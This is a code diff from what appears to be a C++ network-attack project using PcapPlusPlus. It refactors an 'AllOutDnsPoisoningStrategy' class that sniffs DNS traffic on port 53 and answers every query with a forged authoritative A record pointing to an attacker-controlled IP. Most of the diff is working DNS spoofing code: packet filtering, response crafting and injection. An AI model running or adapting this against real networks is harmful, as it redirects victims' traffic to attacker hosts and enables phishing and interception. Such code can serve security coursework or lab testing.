@@ -4,66 +4,70 @@
 #include "PcapLiveDevice.h"
 #include "RawPacket.h"
 #include "log.h"
+#include <DnsLayer.h>
+#include <IPv4Layer.h>
+#include <UdpLayer.h>
 #include <future>
 #include <stdexcept>
-#include <IPv4Layer.h>
-#include <DnsLayer.h>
-#include <UdpLayer.h>
+
+const int DNS_PORT = 53;
 
 void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
     // currently unused, no termination condition
     // auto *completionFuture = static_cast<std::promise<void> *>(cookie);
 
-    pcpp::Packet parsedPacket(packet);
+    const pcpp::Packet parsedPacket(packet);
     auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
     auto *requestIpLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
     auto *requestUdpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
     auto *requestDnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
 
-    if (requestEthLayer == nullptr || requestIpLayer == nullptr || requestUdpLayer == nullptr ||
-        requestDnsLayer == nullptr) {
+    if (requestEthLayer == nullptr || requestIpLayer == nullptr ||
+        requestUdpLayer == nullptr || requestDnsLayer == nullptr) {
         LOG_INFO("Not a DNS packet");
         return;
     }
 
-    // TODO determine whether or not to handle packet
-    // 
-    //if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
-    //    requestIpLayer->getSrcIPv4Address() == device->getIPv4Address() ||
-    //    requestUdpLayer.getdns
-    //    ) {
-    //    LOG_INFO("skipped packet");
-    //    return;
-    //}
+    if (requestEthLayer->getSourceMac() == device->getMacAddress() ||
+        requestIpLayer->getSrcIPv4Address() == device->getIPv4Address()) {
+        LOG_INFO("skipped packet");
+        return;
+    }
 
     // if the packet is not a DNS request, ignore it
     if (requestDnsLayer == nullptr ||
-        !requestDnsLayer->getDnsHeader()->queryOrResponse == 0)
+        !(requestDnsLayer->getDnsHeader()->queryOrResponse == 0)) {
         return;
+    }
     // try to get the query from the packet
     auto *dnsQuery = requestDnsLayer->getFirstQuery();
-    if (dnsQuery == nullptr)
+    if (dnsQuery == nullptr) {
         return;
+    }
 
     // craft response packet
     pcpp::EthLayer ethResponse(device_->getMacAddress(),
                                requestEthLayer->getSourceMac());
     pcpp::IPv4Layer ipResponse(device_->getIPv4Address(),
                                requestIpLayer->getSrcIPv4Address());
-    pcpp::UdpLayer udpResponse(53, requestUdpLayer->getSrcPort());
+    pcpp::UdpLayer udpResponse(DNS_PORT, requestUdpLayer->getSrcPort());
 
     pcpp::DnsLayer dnsResponse;
-    dnsResponse.getDnsHeader()->transactionID = requestDnsLayer->getDnsHeader()->transactionID;
+    dnsResponse.getDnsHeader()->transactionID =
+        requestDnsLayer->getDnsHeader()->transactionID;
     dnsResponse.getDnsHeader()->queryOrResponse = 1; // response
     dnsResponse.getDnsHeader()->authoritativeAnswer = 1;
     dnsResponse.getDnsHeader()->recursionAvailable = 1;
-    dnsResponse.getDnsHeader()->recursionDesired = requestDnsLayer->getDnsHeader()->recursionDesired;
+    dnsResponse.getDnsHeader()->recursionDesired =
+        requestDnsLayer->getDnsHeader()->recursionDesired;
 
     dnsResponse.addQuery(dnsQuery); // Repeat the question
     pcpp::IPv4DnsResourceData attackerIpData(attackerIp_);
+    // TODO (kala and nick) figure out TTL value
+    const int ttl = 60;
     dnsResponse.addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A,
-                              pcpp::DNS_CLASS_IN, 60, &attackerIpData);
+                          pcpp::DNS_CLASS_IN, ttl, &attackerIpData);
 
     pcpp::Packet responsePacket(DNS_PACKET_SIZE);
     responsePacket.addLayer(&ethResponse);
@@ -82,16 +86,14 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
 void ATK::DNS::AllOutDnsPoisoningStrategy::execute() {
     std::promise<void> completionPromise;
     std::future completionFuture = completionPromise.get_future();
-    
-    // TODO decide if default port is enough
-    const int DNS_PORT = 53;
-    
+
+    // TODO(kala and nick) decide if default port is enough
+
     pcpp::PortFilter dnsPortFilter(DNS_PORT, pcpp::SRC_OR_DST);
     pcpp::ProtoFilter udpFilter(pcpp::UDP);
     pcpp::AndFilter filter;
     filter.addFilter(&dnsPortFilter);
     filter.addFilter(&udpFilter);
-
 
     if (!device_->setFilter(filter)) {
         device_->close();
